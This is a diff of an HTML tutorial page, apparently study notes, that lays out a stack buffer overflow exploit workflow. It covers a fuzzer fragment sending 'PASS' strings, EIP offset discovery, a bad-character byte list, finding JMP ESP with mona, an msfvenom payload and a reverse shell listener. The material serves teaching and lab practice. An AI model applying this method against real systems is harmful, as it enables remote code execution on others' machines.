+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span> <span class="o">+</span> <span class="n">string</span> <span class="o">+</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> 
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> 
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> 
+</code></pre></div></div>
+
+<p>2.) We need to figure out where the program crashed. Use <code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size]</code>, where size is a possible size that crashed the program in the previous step. This program will create a string that you should use as input into the program. After sending the string to the program, view it in a debugger, and copy the value of EIP right when the program crashed. You can then use <code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [size] -q [EIP's value]"</code> to discover the precise location where you can rewrite EIP.</p>
+
+<p>3.) We need to check for bad characters, which are characters that should not be in your shellcode because they could delete part of your string (such as the \x00 character, which terminates strings in C). Below, there is a list of characters.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" 
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" 
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" 
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" 
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" 
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" 
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" 
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" 
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" 
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" 
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" 
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" 
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" 
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
+</code></pre></div></div>
+
+<p>Send the whole string to the vulnerable application. If one of the character is a badchar, then it will delete the rest of the string or not show up. Gradually delete values that are badchars until the whole string is able to be sent, and make sure you keep a list of badchars that have been deleted.</p>
+
+<p>4.) We need to find some instruction that says “JMP ESP” so that we can just jump to the location our input and start executing code. Use the <code class="highlighter-rouge">!mona modules</code> command in Immunity to find DLLs that have Rebase, SafeSEH, ASLR, and NXCompat set to false (which basically means that the DLL will always load at the same address). Once you find a good DLL, use the follwing command to find a JMP ESP command: <code class="highlighter-rouge">!mona find -s "\xff\xe4" -m [DLL's file name]</code>. Note that the hex equivalent of JMP ESP is \xff\xe4, but you may have to modify this depending on your machine. This command will return a list of pointers to a JMP ESP instruction; select one that does not have any bad characters. If you’re using EDB, open up the OpcodeSearcher plugin, set the Jump Equivalent value to ESP-&gt;EIP, and hit find. Confirm that the JMP works by setting a breakpoint at that location and setting EIP equal to that address of the jump instruction using the buffer overflow.</p>
+
+<p>5.) Develop a payload using msfvenom that does not contain any bad characters.</p>
+
+<p>6.) After you create the payload, sometimes you may have to execute some extra code before running the payload, in which case, you can use /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to quickly write assembly code. You may also want to put a NOP sled at the beginning of your code if there is space.</p>
+
+<p>7.) Setup a reverse shell listener. Create your final exploit and run it.</p>
 
     
 
